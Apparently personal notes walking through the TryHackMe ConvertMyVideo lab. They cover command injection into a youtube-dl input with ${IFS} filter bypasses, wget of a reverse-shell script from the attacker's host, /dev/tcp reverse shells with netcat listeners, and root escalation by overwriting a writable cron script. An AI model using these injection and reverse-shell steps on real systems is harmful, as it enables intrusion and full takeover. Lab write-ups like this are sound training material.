In this capstone we will compromise this machine:
- [https://tryhackme.com/r/room/convertmyvideo](https://tryhackme.com/r/room/convertmyvideo)

# nmap scan

```bash
nmap -T4 -p- -A HOST_IP
```
- ![[Pasted image 20250120150820.png]]

# Enumerating website
We start on the website and we start understand how its functionalities work:
- ![[Pasted image 20250120150902.png]]

We put `test` but nothing interesting.

We look at the source code:
- ![[Pasted image 20250120150940.png]]
- But nothing.



So let's check with `burp intercept on`:
- ![[Pasted image 20250120151041.png]]
- we put `test` on the input field


We send it to the repeater and we see the response:
- 
![[Pasted image 20250120151135.png]]


We can just see that the files are saved in `/tmp/downloads`

And that it uses `youtube-dl` to do the convertion, so we look at it:
- [https://github.com/ytdl-org/youtube-dl](https://github.com/ytdl-org/youtube-dl)

So basically it must run a command `youtube-dl URL`. 

Let's try to abuse it using the backticks:
```bash
`ls`
```
- ![[Pasted image 20250120151516.png]]
- it says `u'admin' is not a valid url` so we have a sort of command injection
- `admin` is a folder in this case


So we try:
```bash
`ls -la`
```
- ![[Pasted image 20250120151621.png]]
- It doesn't accept spaces



So let's try:
```bash
`ls%20-la`
```
- ![[Pasted image 20250120151733.png]]
- so nothing


We have to find a way to insert spaces... Just search on google and we find that we can use a special variable in shell called `IFS`.


It works because if we use `${IFS}` it will put a space after it automatically:
```bash
`ls${IFS}-la`
```
- ![[Pasted image 20250120152008.png]]
- OK BUT MAYBE IT DOESN'T WANT THE `-`



So just check using:
```bash
`ping${IFS}127.0.0.1`
```
- it stops and does nothing, so under the surface it is doing the ping
- ![[Pasted image 20250120152147.png]]


So we can try to put a reverse shell file `.sh` on the victim and execute it, using this command injection.

# shell injection
We create a file `.sh` called `rev.sh` with this content:
```bash
bash -i >& /dev/tcp/OUR_IP/8888 0>&1
```
- ![[Pasted image 20250120152426.png]]


At this point we set a server to serve this file usign:
```bash
python -m SimpleHTTPServer 80
```


So on burp we put:
```bash
`wget${IFS}http://OUR_IP/rev.sh`
```
- ![[Pasted image 20250120152621.png]]

The file is on the victim machine now.

So make it executable:
```bash
`chmod${IFS}777${IFS}rev.sh`
```
- ![[Pasted image 20250120152724.png]]
- we use `777` and not `+x` because `+` is not allowed


Now, just set a listener on our machine:
```bash
nc -nvlp 8888
```

Now we need to run it and we have done:
```bash
`bash${IFS}rev.sh`
```
- ![[Pasted image 20250120152918.png]]
- ![[Pasted image 20250120152925.png]]

We have a user shell.


# Privilege escalation
We do all the checks but nothing interesting.

# Crontab
We can also check `crontab`
```bash
cat /etc/crontab
```
- ![[Pasted image 20250120154252.png]]

We have no crontabs

But if we look at the processes:
```bash
ps aux
```
- ![[Pasted image 20250120154330.png]]
- we can see that `cron` is run from `root` somewhere

So now we will use `pspy`:
- 
[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)


And we get `pspy64`:
- ![[Pasted image 20250120154546.png]]
- we got it from our host



We make it executable:
```bash
chmod +x pspy64
```


And then we run it:
```bash
./pspy64
```
- ![[Pasted image 20250120154735.png]]

We can see this `/var/www/html/tmp/clean.sh` that is interesting


So we do `ctrl+c` and we have to reconnect the shell with burp:
1. send file
2. make executable
3. run


# change `clean.sh`
We do:
```bash
cd var/qqq/html/tmp
```

And we look at the permission on `clean.sh`:
```bash
ls -la
```
- ![[Pasted image 20250120155021.png]]
- we are the owner of the file and we can write on it

So make it executable:
```bash
chmod 777 clean.sh
```


Now we make it a reverse shell:
```bash
echo "bash -i >& /dev/tcp/OUR_IP/5555 0>&1" > clean.sh 
```
- ![[Pasted image 20250120155231.png]]

We run a listener on our host:
```bash
nc -nvlp 5555
```

We wait a little bit and we obtain a root shell:
- ![[Pasted image 20250120155351.png]]

We gain a root shell!